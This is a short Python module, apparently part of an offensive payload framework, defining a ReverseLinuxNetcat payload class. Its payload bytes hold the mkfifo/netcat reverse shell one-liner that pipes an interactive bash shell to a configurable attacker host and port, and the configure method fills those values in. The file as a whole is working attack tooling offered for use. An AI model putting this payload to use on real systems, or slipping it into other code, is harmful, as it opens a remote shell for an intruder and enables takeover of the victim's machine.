import typing

from core import payloadcore
from shells import shellsindex


class ReverseLinuxNetcat(payloadcore.Payload):

    AUTHOR: str = "Danakane"
    PAYLOAD: bytes = b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f" \
                     b"|/bin/bash -i 2>&1|nc \x00\x00\x00\x00 " \
                     b"\x00\x00 >/tmp/f\0"

    def __init__(self):
        super(ReverseLinuxNetcat, self).__init__()
        params: typing.Dict[str, str] = {"lhost": "The host to listen on", "lport": "The port to listen on"}
        self.customize(ReverseLinuxNetcat.PAYLOAD, shellsindex.ShellsIndex.basicreverse, params)
        self.configure = self.__doconfig__

    def __doconfig__(self, lhost: str, lport: str) -> None:
        host: bytes = lhost.encode()
        port: bytes = lport.encode()
        raw: bytes = self.raw.replace(b"\x00\x00\x00\x00", host).replace(b"\x00\x00", port)
        self.raw = raw


blueprint: typing.Callable = ReverseLinuxNetcat
